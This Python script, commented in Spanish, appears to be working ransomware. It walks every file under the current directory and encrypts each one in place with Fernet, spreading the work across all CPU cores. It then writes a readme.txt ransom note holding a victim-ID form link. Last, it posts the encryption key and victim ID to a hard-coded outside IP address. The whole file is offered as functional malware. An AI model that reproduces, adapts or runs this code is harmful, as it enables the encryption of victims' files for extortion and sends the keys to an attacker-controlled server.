from pathlib import Path
import secrets
import base64
import getpass

#No hay criptographjy en Windows
import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

from multiprocessing import cpu_count
from multiprocessing import Process
from multiprocessing import freeze_support

from requests import post
from random import randint
from datetime import datetime

def generate_id(min, max):
    random_number = randint(min, max)
    
    current_datetime = datetime.now()
    
    formatted_datetime = current_datetime.strftime('%Y%m%d%H%M%S')

    generated_id = f'{random_number}{formatted_datetime}'
    
    return generated_id

def send_key(ip, key, indentificador):
    #Molaría hacerla async
    datos = {'key': key, 'id': indentificador}
    respuesta = post(ip, datos)
    return respuesta.text

def reparto(len_list, partes):
# Siempre y cuando len(lista)>partes
    cores = partes

    #print(f'len_list:{len_list}')
    dx = len_list // cores
    mod = len_list % cores
    orden = [0]

    n = cores

    start = 0

    while n > 0:
        ptr = start + dx
        
        if mod > 0:
            ptr += 1
            mod -= 1

        orden.append(ptr)
        start = ptr
        n -= 1

    return orden

def tree(directory):
    archivos = []
    try:
        for path in sorted(directory.rglob("*")):
            file_path = Path(path)
            if file_path.is_file():
                archivo = str(path.resolve())
                archivos.append(archivo)
    except:
        pass
    return archivos, len(archivos)

def encrypt(filename, key):
    """Given a filename (str) and key (bytes), it encrypts the file and write it"""
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # encrypt data
    encrypted_data = f.encrypt(file_data)
    # write the encrypted file
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def derive_key(salt, password):
    """Derive the key from the `password` using the passed `salt`"""
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())

def generate_salt(size=16):
    """Generate the salt used for key derivation, 
    `size` is the length of the salt to generate"""
    return secrets.token_bytes(size)

def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):

    # generate new salt and save it
    salt = generate_salt(salt_size)

    # generate the key from the salt and the password
    derived_key = derive_key(salt, password)
    #derived_key = derive_key(password)
    # encode it using Base 64 and return it
    return base64.urlsafe_b64encode(derived_key)

def encrypt_array(files, key):
    for file in files:
        encrypt(file, key)

if __name__ == "__main__":
    
    url = "http://158.179.216.54/hola"
    send_url = f'{url}/index.php'
    form_url = f'{url}/form.php?id='

    freeze_support()

    passwd = generate_key("passwd")
    #print(f'key: {passwd}')

    archivos_array, len_archivos = tree(Path.cwd())
    #print(f'Archivos: {archivos_array}, len_archivos: {len_archivos}')

    cores = cpu_count()
    #print(f'Cores: {cores}')

    procesos = []
    #print(f'Procesos (debería estar vacio): {procesos}')

    reparto_array = reparto(len_archivos, cores)
    #print(f'reparto: {reparto_array}')

    #Si hay más archivos que cores, si no estamos creando procesos de más
    for core in range(cores):

        start = reparto_array[core]
        end = reparto_array[core + 1]

        # Hay que pasar una tuple a args
        proceso = Process(target=encrypt_array, args=(archivos_array[start:end], passwd))
        #print(f'start:{start}, end: {end}, diff: {end - start}')
        #print(f'Proceso creado {core}')
        procesos.append(proceso)
        #print(f'Proceso append {core}')
        proceso.start()
        #print(f'Proceso start {core}')

    #print(f'Procesos (deberia haber 1 por core): {procesos}, ratio: {len(procesos)/cores}')

    # Espera a que acabe todos los procesos
    for proceso in procesos:
        proceso.join()
        #print(f'Proceso join {proceso}')
    

    indentificador = generate_id(1, 9999)

    with open('readme.txt', 'w') as readme:
        readme.write(f'{form_url}{indentificador}')

    respuesta = send_key(send_url, passwd, indentificador)
    #print(respuesta)